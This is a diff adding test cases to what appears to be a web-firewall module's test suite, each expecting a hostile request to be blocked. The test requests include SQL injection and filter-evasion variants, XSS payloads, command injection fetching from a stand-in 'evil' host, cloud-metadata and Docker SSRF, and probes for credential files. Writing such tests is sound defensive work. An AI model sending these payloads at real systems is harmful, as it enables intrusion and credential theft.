@@ -133,3 +133,115 @@ GET /t/c99.php
 --- request
 GET /t?url=http://169.254.169.254/latest/meta-data/
 --- error_code: 403
+
+=== TEST 19: SQLi UNION separated by a decoded tab
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?id=1%20union%09select%20password%20from%20users
+--- error_code: 403
+
+=== TEST 20: SQLi UNION separated by a comment
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?id=1%20union/**/select%20password%20from%20users
+--- error_code: 403
+
+=== TEST 21: XSS data URI
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?next=data:text/html;base64,PHNjcmlwdD4=
+--- error_code: 403
+
+=== TEST 22: command injection with an AND separator
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?host=127.0.0.1%26%26curl%20http://evil/x
+--- error_code: 403
+
+=== TEST 23: gcloud credential-store probe
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t/.config/gcloud/application_default_credentials.json
+--- error_code: 403
+
+=== TEST 24: Rails master-key probe
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t/config/master.key
+--- error_code: 403
+
+=== TEST 25: octal cloud-metadata IP evasion
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?url=http://025177524776/latest/meta-data/
+--- error_code: 403
+
+=== TEST 26: IPv4-mapped IPv6 cloud-metadata evasion
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/
+--- error_code: 403
+
+=== TEST 27: SQL Server OLE automation escape primitive
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?id=1;EXEC%20sp_OACreate%20'WScript.Shell'
+--- error_code: 403
+
+=== TEST 28: XSS entity-encoded javascript protocol
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?next=javascript%26%23x3a%3Balert(1)
+--- error_code: 403
+
+=== TEST 29: command injection with an OR separator
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?host=127.0.0.1%7C%7Cwget%20http://evil/x
+--- error_code: 403
+
+=== TEST 30: proc maps disclosure target
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t/proc/self/maps
+--- error_code: 403
+
+=== TEST 31: Unicode-stop cloud-metadata IP evasion
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?url=http://169%E3%80%82254%E3%80%82169%E3%80%82254/latest/meta-data/
+--- error_code: 403
+
+=== TEST 32: loopback Docker API SSRF
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?url=http://0x7f000001:2375/containers/json
+--- error_code: 403
+
+=== TEST 33: sudoers disclosure target
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t/etc/sudoers
+--- error_code: 403
+
+=== TEST 34: package-manager credential probe
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t/.config/composer/auth.json
+--- error_code: 403
